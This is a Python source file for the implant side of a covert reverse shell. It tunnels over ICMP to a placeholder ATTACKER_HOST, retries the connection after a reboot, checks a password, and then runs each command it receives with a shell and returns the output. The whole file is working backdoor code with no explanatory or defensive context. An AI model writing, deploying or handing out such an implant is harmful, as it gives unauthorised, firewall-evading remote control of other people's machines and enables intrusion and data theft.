#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, time, string, argparse, subprocess
from icmpclient import Icmpclient
from const import *

def shell(client):
    cmd = ""
    os.chdir("/")
    while not "exit" in cmd:
        cmd = client.recv(1)
        if "N0TH1NG" == cmd:
            continue
        if "cd" == cmd[0:2]:
            try:
                os.chdir(cmd[3:])
                s.send("N0TH1NG")
            except:
                s.send("cd: " + cmd[3:] + ": No such file or directory")
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read()
            output += proc.stderr.read()
            client.send(output.strip())
            time.sleep(1)

############## MAIN ###############
ID = os.getpid() & 0xFFFF

# retry socket opening until success
# for when the network is not up yet on reboot
while True:
    try:
        s = Icmpclient(ID, ATTACKER_HOST)
        break
    except Exception, err:
        if err.errno == 1: #permission denied
            raise
        time.sleep(1)

while True:
    s.send("Login with your password")
    resp = s.recv(5) # wait for password
    if resp == PASSWORD:
        s.send("Connected")
        shell(s)

